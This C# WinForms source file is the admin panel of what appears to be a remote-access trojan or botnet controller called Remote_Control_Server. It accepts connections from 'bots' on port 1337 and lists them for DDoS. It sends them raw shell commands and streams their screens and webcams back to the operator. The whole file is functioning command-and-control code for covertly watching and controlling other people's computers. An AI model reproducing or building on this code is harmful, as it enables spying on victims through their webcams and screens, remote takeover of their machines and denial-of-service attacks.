using System;
using System.Collections.Generic;
using System.Data;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using MetroFramework;
using Bunifu;
using MaterialSkin;
using System.Drawing;
using System.Text.RegularExpressions;
using System.Linq;
using System.IO;

namespace Remote_Control_Server.UI
{
    public partial class AdminControl : Form
    {
        public AdminControl()
        {
            InitializeComponent();
        }
        public MetroFramework.Controls.MetroButton _btn = new MetroFramework.Controls.MetroButton();
        public Bunifu.Framework.UI.BunifuImageButton _panel = new Bunifu.Framework.UI.BunifuImageButton();
        public Bunifu.Framework.UI.BunifuImageButton _rdpPanelDIsplay = new Bunifu.Framework.UI.BunifuImageButton();
        public string my_prefix = "krx@UnixServer SHELL :~$   ";
        public string their_prefix = "@UnixServer SHELL :~$   ";

        Thread threadWatch = null;
        Socket socketWatch = null;

        Dictionary<string, Socket> dict_socket = new Dictionary<string, Socket>();
        Dictionary<string, Thread> dictThread = new Dictionary<string, Thread>();

        IPEndPoint ipendpoint = new IPEndPoint(IPAddress.Parse("192.168.0.3"), 1337);


        ListBox lbonline = new ListBox();
        public bool offline = false;

        bool stopServer = false;

        private void bunifuImageButton3_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Normal;
                return;
            }
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
                return;
            }
        }

        private void bunifuImageButton2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void closeControl_Click(object sender, EventArgs e)
        {
            Environment.Exit(1);

        }

        private void AdminControl_Load(object sender, EventArgs e)
        {
            Form1 _Frm = new Form1();
            _Frm.Hide();
            tabcontrols.SelectedTab = computerspage;

        }

        private void startServerToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            socketWatch = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                socketWatch.Bind(ipendpoint);
                statuslabel.Text = "Running ../.";
            }
            catch (SocketException ex) { statuslabel.Text = "Stopped "; MessageBox.Show(ex.ToString()); }
            catch (Exception ex) { statuslabel.Text = "Stopped "; MessageBox.Show(ex.ToString()); }
            socketWatch.Listen(10);

            threadWatch = new Thread(watchConnection);
            threadWatch.IsBackground = true;
            threadWatch.Start();
        }
        public string addr;
        public string[] splitip;
        public string justip;
        public void watchConnection()
        {
            while (!stopServer)
            {
                if (stopServer) { break; }

                Socket socketConnection = null;

                try
                {
                    socketConnection = socketWatch.Accept();
                    addr = socketConnection.RemoteEndPoint.ToString();
                    //splitip = Regex.Split(addr, ":");
                    //justip = splitip[0].ToString();

                    if (!lbonline.Items.Contains(addr))//socketConnection.RemoteEndPoint.ToString()))
                    {
                        onlineList.Items.Add(addr);//socketConnection.RemoteEndPoint.ToString());
                        lbonline.Items.Add(addr);//socketConnection.RemoteEndPoint.ToString());
                        dict_socket.Add(addr, socketConnection);
                        /* addbot(justip);*///socketConnection.RemoteEndPoint.ToString());
                        ddosList.Items.Add(addr);

                        Thread threadCommunicate = new Thread(ReceiveMsg);
                        threadCommunicate.IsBackground = true;
                        threadCommunicate.Start(socketConnection);//有传入参数的线程

                        Thread getOS = new Thread(() => automation_msg("os_", socketConnection.RemoteEndPoint.ToString()));
                        getOS.IsBackground = true;
                        getOS.Start();
                         
 


                        dictThread.Add(addr, threadCommunicate);


                    }

                }


                catch (SocketException ex) { MessageBox.Show(ex.ToString()); }
                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        public void addbot(object socketConnection, int os)
        {

            Socket sock = socketConnection as Socket;
            //addr = sock.RemoteEndPoint.ToString();
            //string[] splitip = Regex.Split(addr, ":");
            string ip = sock.RemoteEndPoint.ToString();
            ToolStripMenuItem _commandPrompt = new ToolStripMenuItem();
            _commandPrompt.Text = "Process List";
            _commandPrompt.Click += new EventHandler(_cmdmenustrip);

            ToolStripMenuItem _rdpmenu = new ToolStripMenuItem();
            _rdpmenu.Text = "Remote Desktop";
            _rdpmenu.Click += new EventHandler(_rdpmenustrip);

            ToolStripMenuItem _camMenu = new ToolStripMenuItem();
            _camMenu.Text = "Remote WebCam";
            _camMenu.Click += new EventHandler(_camMenustrip);
            ContextMenuStrip _menu = new ContextMenuStrip();
            _menu.Items.Add(_commandPrompt);
            _menu.Items.Add(_rdpmenu);
            _menu.Items.Add(_camMenu);

            if (this.InvokeRequired)
            {
                this.BeginInvoke((MethodInvoker)delegate ()
                {

                    if (os == 10)
                    {
                        _panel = new Bunifu.Framework.UI.BunifuImageButton()
                        {
                            Name = ip,
                            BackColor = Color.White,
                            ForeColor = Color.DimGray,
                            BackgroundImage = Properties.Resources.win10,
                            BackgroundImageLayout = ImageLayout.Center,
                            Size = new Size(200, 120),
                            Zoom = 3

                        };

                    }
                    if (os == 7)
                    {
                        _panel = new Bunifu.Framework.UI.BunifuImageButton()
                        {
                            Name = ip,
                            BackColor = Color.White,
                            ForeColor = Color.DimGray,
                            BackgroundImage = Properties.Resources.win7,
                            BackgroundImageLayout = ImageLayout.Center,
                            Size = new Size(200, 120),
                            Zoom = 3

                        };

                    }
                    if (os == 2)//2 is a windows xp
                    {
                        _panel = new Bunifu.Framework.UI.BunifuImageButton()
                        {
                            Name = ip,
                            BackColor = Color.White,
                            ForeColor = Color.DimGray,
                            BackgroundImage = Properties.Resources.microsoft_windows_logo,
                            BackgroundImageLayout = ImageLayout.Center,
                            Size = new Size(200, 120),
                            Zoom = 3

                        };

                    }
                    _btn = new MetroFramework.Controls.MetroButton()
                    {
                        Text = ip,
                        Dock = DockStyle.Bottom,
                        Size = new Size(144, 18),


                    };
                    _btn.Click += new EventHandler(ip_click);
                    _panel.Controls.Add(_btn);
                    _panel.ContextMenuStrip = _menu;
                    flowLayoutPanel1.Controls.Add(_panel);




                });

            }


        }

        private void _camMenustrip(object sender, EventArgs e)
        {
            camFlowPanel.Controls.Clear();
            string user_id = _panel.Name.ToString();
            automation_msg("camlist_", user_id);
            tabcontrols.SelectedTab = campage;
        }

        private void _rdpmenustrip(object sender, EventArgs e)
        {
            rdpFlowPanel.Controls.Clear();
            string user_id = _panel.Name.ToString();
            automation_msg("listscreen_", user_id) ;
            tabcontrols.SelectedTab = rmspage;

        }

        private void _cmdmenustrip(object sender, EventArgs e)
        {
            string user_id = _panel.Name.ToString();
            onlineList.SelectedItem = user_id;
            tabcontrols.SelectedTab = cmdPage;
        }

        public void addDisplay(object sock, int count)
        {
            Socket _client = sock as Socket;
            if (this.InvokeRequired)
            {
                this.BeginInvoke((MethodInvoker)delegate ()
                {
                    Bunifu.Framework.UI.BunifuImageButton[] displayList = new Bunifu.Framework.UI.BunifuImageButton[count];
                    MetroFramework.Controls.MetroButton[] butns = new MetroFramework.Controls.MetroButton[count];
                    int brh = 0;


                    for (int i = 0; i < count; i++)
                    {
                        if (rdpFlowPanel.Controls.Contains(displayList[i]))
                        {
                            var controltoremove = flowLayoutPanel1.Controls[i];
                            controltoremove.Visible = false;
                            rdpFlowPanel.Controls.Remove(controltoremove);

                        }
                        displayList[i] = new Bunifu.Framework.UI.BunifuImageButton();
                        displayList[i].BackColor = Color.White;
                        displayList[i].Image = Properties.Resources.rdpDisplay;
                        displayList[i].Location = new Point(953, 95 + brh);
                        displayList[i].Size = new Size(200, 120);
                        displayList[i].Name = _client.RemoteEndPoint.ToString();
                        displayList[i].Zoom = 0;

                        butns[i] = new MetroFramework.Controls.MetroButton();
                        butns[i].Click += new EventHandler(selectMonitor_onClick);
                        int id = i;/*1 + i;*/
                        butns[i].Text = id.ToString() + "_" + _client.RemoteEndPoint.ToString();
                        butns[i].Name = "but" + i;
                        butns[i].Size = new Size(144, 18);
                        butns[i].Dock = DockStyle.Bottom;
                        displayList[i].Controls.Add(butns[i]);
                        rdpFlowPanel.Size = new Size(200, 120);
                        rdpFlowPanel.Controls.Add(displayList[i]);


                    }

                });
            }
        }

        public void addcamera(object sock, int count)
        {
            Socket _client = sock as Socket;
            if (this.InvokeRequired)
            {
                this.BeginInvoke((MethodInvoker)delegate ()
                {
                    Bunifu.Framework.UI.BunifuImageButton[] _cameraPicture = new Bunifu.Framework.UI.BunifuImageButton[count];
                    MetroFramework.Controls.MetroButton[] _camerabutton = new MetroFramework.Controls.MetroButton[count];
                    int brh = 0;


                    for (int i = 0; i < count; i++)
                    {
                        if (camFlowPanel.Controls.Contains(_cameraPicture[i]))
                        {
                            var controltoremove = camFlowPanel.Controls[i];
                            controltoremove.Visible = false;
                            camFlowPanel.Controls.Remove(controltoremove);

                        }
                        _cameraPicture[i] = new Bunifu.Framework.UI.BunifuImageButton();
                        _cameraPicture[i].BackColor = Color.White;
                        _cameraPicture[i].Image = Properties.Resources.webcam;
                        _cameraPicture[i].Location = new Point(953, 95 + brh);
                        _cameraPicture[i].Size = new Size(180, 120);
                        _cameraPicture[i].Name = _client.RemoteEndPoint.ToString();
                        _cameraPicture[i].Zoom = 0;

                        _camerabutton[i] = new MetroFramework.Controls.MetroButton();
                        _camerabutton[i].Click += new EventHandler(selectCameraOnClick);

                        _camerabutton[i].Text = i.ToString() + "_" + _client.RemoteEndPoint.ToString();

                        _camerabutton[i].Name = "but" + i;
                        _camerabutton[i].Size = new Size(144, 18);
                        _camerabutton[i].Dock = DockStyle.Bottom;
                        _cameraPicture[i].Controls.Add(_camerabutton[i]);
                        camFlowPanel.Size = new Size(200, 120);
                        camFlowPanel.Controls.Add(_cameraPicture[i]);
                    }
                });
            }
        }

        private void selectCameraOnClick(object sender, EventArgs e)
        {
            Button button = sender as Button;
            string buttonText = button.Text;
            string[] splitMonitrAndUser = Regex.Split(buttonText, "_");
            string camera_Id = splitMonitrAndUser[0].ToString();
            string client_id = splitMonitrAndUser[1].ToString();
            camSTOPbtn.Text = client_id;
            automation_msg("camstart_" + camera_Id, client_id);
            if (camFlowPanel.Visible)
            {
                camFlowPanel.Visible = false;
            }
        }

        public bool startrdp = true;
        public void selectMonitor_onClick(object sender, EventArgs e)
        {


            Button button = sender as Button;
            string buttonText = button.Text;
            string[] splitMonitrAndUser = Regex.Split(buttonText, "_");
            string monitor = splitMonitrAndUser[0].ToString();
            string client_id = splitMonitrAndUser[1].ToString();
            rdpStopBtn.Text = client_id;
            automation_msg("startrdp_" + monitor, client_id);
            if (rdpFlowPanel.Visible)
            {
                rdpFlowPanel.Visible = false;
            }

        }

        public void ip_click(object sender, EventArgs e)
        {
            Button button = sender as Button;
            string buttonText = button.Text;
            MessageBox.Show(buttonText);
        }
        public void leftsidebar_Paint(object sender, PaintEventArgs e)
        {

        }

        public void privateMSG()
        {

            if (string.IsNullOrEmpty(onlineList.Text))
            {
                MessageBox.Show("Please select a user");
            }
            else
            {
                string commandText = commandBox.Text.Trim();
                byte[] arrayCommand = Encoding.UTF8.GetBytes(commandText);
                string client_id = onlineList.Text;
                try
                {
                    dict_socket[onlineList.Text].Send(arrayCommand);
                    outbox_write(my_prefix + commandText + " --- > " + client_id);
                    commandBox.Text = "";
                }
                catch (SocketException ex) { MessageBox.Show(ex.ToString()); }
                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        public void automation_msg(string text, string ip)
        {
            byte[] arrayCommand = Encoding.UTF8.GetBytes(text);
            string client_id = ip;
            try
            {
                dict_socket[client_id].Send(arrayCommand);
                outbox_write(my_prefix + text + " --- > " + client_id);
            }
            catch (SocketException ex) { MessageBox.Show(ex.ToString()); }
            catch (Exception ex) { MessageBox.Show(ex.ToString()); }
        }
        void ReceiveMsg(object socketClientPara)
        {
            Socket socketClient = socketClientPara as Socket;


            while (true)
            {
                Thread.SpinWait(5000);
                byte[] arrMsgRev = new byte[20971520];
                int length = -1;
                try
                {
                    length = socketClient.Receive(arrMsgRev);

                }
                catch (SocketException ex)
                {
                    //all of control removing works perfectly 100% 
                    //soft detects all disconnected ip address perfectly
                    //but problem is with specify panel detection for removing
                    string addr = socketClient.RemoteEndPoint.ToString();


                    outbox_write("Disconnected ：" + ex.Message + ", RemoteEndPoint: " + addr);
                    dict_socket.Remove(addr);//socketClient.RemoteEndPoint.ToString());
                    dictThread.Remove(addr);//socketClient.RemoteEndPoint.ToString());
                    onlineList.Items.Remove(addr);//socketClient.RemoteEndPoint.ToString());
                    lbonline.Items.Remove(addr);
                    ddosList.Items.Remove(addr);
                    //MessageBox.Show(addr);
                    var machineLogo = flowLayoutPanel1.Controls[addr.ToString()];
                    machineLogo.Visible = false;
                    flowLayoutPanel1.Controls.Remove(machineLogo);


                    break;
                }

                catch (Exception ex)
                {

                    outbox_write("Disconnected：" + ex.Message);
                    break;
                }
                string incomingMSG = Encoding.ASCII.GetString(arrMsgRev, 0, length);
                string[] split_incoming = Regex.Split(incomingMSG, "_");
                outbox_write(incomingMSG); //debug
                if (split_incoming[0].ToString().StartsWith("os"))
                {

                    if (split_incoming[1].ToString().Contains("Windows 10"))
                    {

                        addbot(socketClient, 10);
                    }
                    if (split_incoming[1].ToString().Contains("Windows 7"))
                    {

                        addbot(socketClient, 7);
                    }
                    if (split_incoming[1].ToString().Contains("Windows XP"))
                    {
                        addbot(socketClient, 2); //2 is a windows xp
                    }


                }
                if (split_incoming[0].ToString().Contains("dsplist"))
                {
                    try
                    {
                        int displayNumber = Convert.ToInt32(split_incoming[1].ToString());
                        addDisplay(socketClient, displayNumber);
                    }
                    catch (Exception ex) { MessageBox.Show(ex.ToString()); }
                }
                if (split_incoming[0].ToString().Contains("rdp"))
                {
                    try
                    {
                        MemoryStream ms;
                        using (ms = new MemoryStream(arrMsgRev))
                        {
                            ms.Write(arrMsgRev, 3, arrMsgRev.Length - 3);
                        }
                        byte[] rdpbyte = ms.ToArray();

                        Thread makerdppic = new Thread(new ThreadStart(() => addRDP(rdpbyte)));
                        makerdppic.IsBackground = true;
                        makerdppic.Start();
                        ms.Flush();
                    }
                    catch (Exception ex) { /*MessageBox.Show(ex.ToString()); return;*/ }
                }
                //if (arrMsgRev[0] == 0)
                if (split_incoming[0].ToString().StartsWith("flist"))
                {
                    try
                    {
                        string total = split_incoming[0].ToString() + split_incoming[1].ToString();
                        if (total.Length > 0)
                        {
                            int index = Convert.ToInt32(split_incoming[1].ToString());

                            addcamera(socketClient, index);
                        }
                    }
                    catch (Exception ex) { MessageBox.Show(ex.ToString()); }

                }
                if (split_incoming[0].ToString().Contains("cam"))
                {
                    try
                    {
                        MemoryStream camMemory;
                        using (camMemory = new MemoryStream(arrMsgRev))
                        {
                            camMemory.Write(arrMsgRev, 3, arrMsgRev.Length - 3);
                        }
                        byte[] camarray = camMemory.ToArray();
                        Thread makeCamPicture = new Thread(new ThreadStart(() => addCAM(camarray)));
                        makeCamPicture.IsBackground = true;
                        makeCamPicture.Start();
                        camMemory.Flush();
                        Array.Clear(arrMsgRev, 0, arrMsgRev.Length);
                    }

                    catch (Exception ex) { /*MessageBox.Show(ex.ToString()); return;*/ }
                }

                
                if (split_incoming[0].ToString().StartsWith("cmddata"))
                {
                    string strMsgReceive = Encoding.UTF8.GetString(arrMsgRev, 1, length - 1);
                    outbox_write(their_prefix + justip + " --- > " + strMsgReceive);
                }

                //else if (arrMsgRev[0] == 1)//1代表文件
                //{

                //    //filemanager
                //    SaveFileDialog sfd = new SaveFileDialog();
                //    if (sfd.ShowDialog(this) == System.Windows.Forms.DialogResult.OK)
                //    {
                //        ////获取文件将要保存的路径
                //        //string fileSavePath = sfd.FileName;
                //        ////创建文件流，让文件流根据路径创建一个文件
                //        //using (FileStream fs = new FileStream(fileSavePath, FileMode.Create))
                //        //{
                //        //    fs.Write(arrMsgRev, 1, length - 1);
                //        //    ShowMsg("文件保存成功: " + fileSavePath);
                //        //}
                //    }

                //}
            }
        }
        #region add remote desktop picture to the rdpBOX
        public void addRDP(byte[] img)
        {
            try
            {
                MemoryStream ms = new MemoryStream(img);
                Bitmap picture = (Bitmap)Image.FromStream(ms);
                rdpBox.Image = picture;
            }
            catch (Exception ex) {/* MessageBox.Show(ex.ToString()); return;*/ }
        }
        #endregion

        #region add remote camera picture to the CAMBOX
        public void addCAM(byte[] img)
        {
            try
            {
                MemoryStream ms = new MemoryStream(img);
                Bitmap picture = (Bitmap)Image.FromStream(ms);
                camBOx.Image = picture;
            }
            catch (Exception ex) {/* MessageBox.Show(ex.ToString()); return;*/ }
        }

        #endregion
        public void outbox_write(string text)
        {

            if (String.IsNullOrEmpty(outputBox.Text))
                outputBox.AppendText(text);
            else
                outputBox.AppendText(Environment.NewLine + text);
            outputBox.ScrollToCaret();

        }

        private void commandBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                if (!string.IsNullOrEmpty(commandBox.Text))
                {
                    privateMSG();
                }
            }
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void stopRemoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            startrdp = false;//click selectMonitor_onClick
        }

        private void rdpStopBtn_Click(object sender, EventArgs e)
        {
            automation_msg("stoprdp_" , rdpStopBtn.Text);
            if (!rdpFlowPanel.Visible)
            {
                rdpFlowPanel.Visible = true;
            }
        }

        private void camSTOPbtn_Click(object sender, EventArgs e)
        {
            automation_msg("stopcam_", camSTOPbtn.Text);
            if (!camFlowPanel.Visible)
            {
                camFlowPanel.Visible = true;
            }
        }

        private void processListBTN_Click(object sender, EventArgs e)
        {

        }
    }
}
